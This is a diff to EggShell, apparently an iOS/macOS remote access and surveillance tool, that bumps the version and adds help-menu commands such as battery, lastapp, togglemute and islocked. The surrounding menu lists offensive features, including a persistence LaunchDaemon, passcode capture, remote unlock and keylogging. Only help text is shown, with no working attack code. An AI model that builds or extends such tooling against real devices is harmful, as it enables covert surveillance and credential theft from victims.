@@ -1,3 +1,4 @@
+#!/usr/bin/python
 #EggShell
 #Created By lucas.py 8-18-16
 debug = 0
@@ -39,7 +40,7 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.5\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.6\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
@@ -149,6 +150,8 @@ def showHelp(CDA):
         showCommand("isplaying","view mediaplayer info")
         showCommand("openurl","open url on device")
         showCommand("dial","dial number on device")
+        showCommand("battery","get battery level")
+        showCommand("lastapp","get bundle id of last app opened")
         showCommand("listapps","list bundle identifiers")
         showCommand("open","open app")
         showCommand("persistence","installs LaunchDaemon - tries to connect every 30 seconds")
@@ -163,6 +166,9 @@ def showHelp(CDA):
         showCommand("pause","pause music")
         showCommand("next","next track")
         showCommand("prev","previous track")
+        showCommand("togglemute","programatically toggles silence switch")
+        showCommand("ismuted","check if we are silenced or not")
+        showCommand("islocked","check if device is locked") #there are ways to get around this, (alwaysunlock) tweak
         showCommand("getpasscode","log successfull passcode attempts")
         showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
         showCommand("keylog","log keystrokes") #not working inside apps...yet
